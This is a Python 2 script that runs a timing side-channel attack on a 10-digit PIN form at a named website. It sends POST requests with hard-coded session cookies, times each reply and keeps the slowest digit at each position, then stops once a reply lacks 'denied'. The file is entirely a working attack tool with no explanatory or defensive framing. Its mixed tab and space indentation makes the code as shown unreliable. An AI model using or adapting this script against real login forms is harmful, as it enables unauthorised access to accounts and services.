#!/usr/bin/env python

 

import urllib2, sys 
from datetime import datetime

url = 'https://www.tagleader.com/pin.php'

#headers = {'Cookie':'PHPSESSID=edu2895ir7kl0hnpq51ipe6d75'}
headers = {'Cookie':'PHPSESSID=07390o7m74oj7olnqlt64mm0h2'}

data_format = 'pin1={}&pin2={}&pin3={}&pin4={}&pin5={}&pin6={}&pin7={}&pin8={}&pin9={}&pin10={}&submit='

tz = datetime.now() - datetime.now()
max = [0,0,0,0,0,0,0,0,0,0]
time = [tz,tz,tz,tz,tz,tz,tz,tz,tz,tz]

p1 = p2 = p3 = p4 = p5 = p6 = p7 = p8 = p9 = p10 = k = 0

if __name__ == '__main__':

    pstart = datetime.now()

    while k<5:
    	print 'Pin {},{},{},{},{},{},{},{},{},{}'.format(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10)
    	print k
	p1 = p2 =p3=p4=p5=p6=p7=p8=p9=p10=0
	k=k+1 
        for i in range(10):

            for j in range(10):

	        if i == 0:
                    p1 = j
                    data = data_format.format(p1, 0, 0, 0, 0, 0, 0, 0, 0, 0)
	        else:
		    p1 = max[0]
	        if i == 1:
		    p2 = j
		    data = data_format.format(p1 ,p2 ,0 ,0 ,0 ,0 ,0 ,0 ,0 ,0)
	        else:
		    p2 = max[1]
	        if i == 2:
		    p3 = j
		    data = data_format.format(p1,p2,p3,0,0,0,0,0,0,0)
	        else:
		    p3 = max[2]
	        if i == 3:		    
		    p4 = j
		    data = data_format.format(p1,p2,p3,p4,0,0,0,0,0,0)
	        else:
		    p4 = max[3]
	        if i == 4:
		    p5 = j
		    data = data_format.format(p1,p2,p3,p4,p5,0,0,0,0,0)
	        else:
		    p5 = max[4]
	        if i == 5:
		    p6 = j
		    data = data_format.format(p1,p2,p3,p4,p5,p6,0,0,0,0)
	        else:
		    p6 = max[5]
	        if i == 6:
		    p7 = j
		    data = data_format.format(p1,p2,p3,p4,p5,p6,p7,0,0,0)
	        else:
		    p7 = max[6]
	        if i == 7:
		    p8 = j
		    data = data_format.format(p1,p2,p3,p4,p5,p6,p7,p8,0,0)
	        else:
		    p8 = max[7]
	        if i == 8:
		    p9 = j
		    data = data_format.format(p1,p2,p3,p4,p5,p6,p7,p8,p9,0)
	        else:
		    p9 = max[8]
	        if i == 9:
		    p10 = j
		    data = data_format.format(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10)
	        else:
		    p10 = max[9]

            # - original location - start = datetime.now()

                req = urllib2.Request(url, data, headers)

	        start = datetime.now()

                res = urllib2.urlopen(req)

	        end = datetime.now()

                message = res.read()

	    # - original location - end = datetime.now()

	        diff = end - start

                if 'denied' not in message:

                    print 'Pin {}, {}, {}, {}, {}, {}, {}, {}, {}, {}'.format(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10)

		    pend = datetime.now()
		    pdiff = pend - pstart

	            print pdiff
		    print k
		    print 'Accepted'

                    sys.exit(0)

                else:

		    if diff > time[i] and j != 0:
			time[i] = diff
			max[i] = j

		    #print 'Pin {}, {}, {}, {}, {}, {}, {}, {}, {}, {}'.format(p1,p2,p3,p4,p5,p6,p7,p8,p9,p10)

		    #print diff

		    #print 'Rejected'
